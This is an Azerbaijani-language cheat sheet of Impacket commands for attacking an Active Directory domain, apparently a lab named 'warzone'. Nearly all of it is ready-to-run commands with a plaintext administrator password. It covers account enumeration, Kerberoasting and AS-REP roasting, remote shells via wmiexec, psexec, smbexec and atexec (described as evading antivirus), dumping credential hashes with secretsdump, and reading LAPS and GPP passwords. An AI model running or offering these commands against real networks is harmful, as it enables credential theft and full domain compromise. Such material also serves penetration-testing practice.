### Domaindəki bütün istifadəçiləri və detallarını çəkmək
```bash
python3 GetADUsers.py -all -dc-ip 192.168.0.239 warzone.oxsium.local/Administrator:sako2005!
```

### SID Enumeration (Bütün userlərin SİD nömrələri ilə tapılması)
```bash
python3 lookupsid.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239
```

### Domain-də Delegasiya konfiqurasiyalarını (zəiflikləri) axtarmaq
```bash
python3 findDelegation.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239
```

# Kerberos Attacks

### Kerberoasting (TGS biletlərini çəkib fayla yazmaq)
```bash
python3 GetUserSPNs.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239 -request -outputfile kerb_hashes.txt
```

### AS-REP Roasting (Pre-auth söndürülmüş userləri tapmaq)
```bash
python3 GetNPUsers.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239 -request -format hashcat
```

### TGT Bileti almaq (Pass-the-Ticket üçün)
```bash
python3 getTGT.py -dc-ip 192.168.0.239 warzone.oxsium.local/Administrator:sako2005!
```
# Initial Access to System

### WMIExec (Antiviruslara qarşı gizli və sürətli terminal)
```bash
python3 wmiexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239
```

### PSExec (Tam interaktiv SYSTEM səviyyəli giriş)
```bash
python3 psexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239
```
### SMBExec (Service yaratmadan, gizli əmr icrası)
```bash
python3 smbexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239
```

### ATExec (Task Scheduler vasitəsilə əmr icrası)
```bash
python3 atexec.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239 "whoami /all"
```

# Information Disclosure

### SecretsDump (Bütün şifrə heşlərini RAM və NTDS-dən çəkmək)
```bash
python3 secretsdump.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239
```

### LAPS Şifrələrini oxumaq (Əgər sistemdə aktivdirsə)
```bash
python3 GetLAPSPassword.py warzone.oxsium.local/Administrator:sako2005! -dc-ip 192.168.0.239
```

### GPP (Group Policy Preferences) daxilindəki şifrələri tapmaq
```bash
python3 Get-GPPPassword.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239
```

# Network And Services

### MSSQL Client (Verilənlər bazası üzərindən əmr icrası)
```bash
python3 mssqlclient.py warzone.oxsium.local/Administrator:sako2005!@192.168.0.239 -windows-auth
```

### SMB Server (Kali-dən hədəf maşına fayl ötürmək üçün saxta qovluq açmaq)
```bash
python3 smbserver.py lab_share $(pwd) -smb2support
```

### RPC Map (Hədəf sistemdəki RPC portlarının siyahısı)
```bash
python3 rpcmap.py -brute 192.168.0.239
```
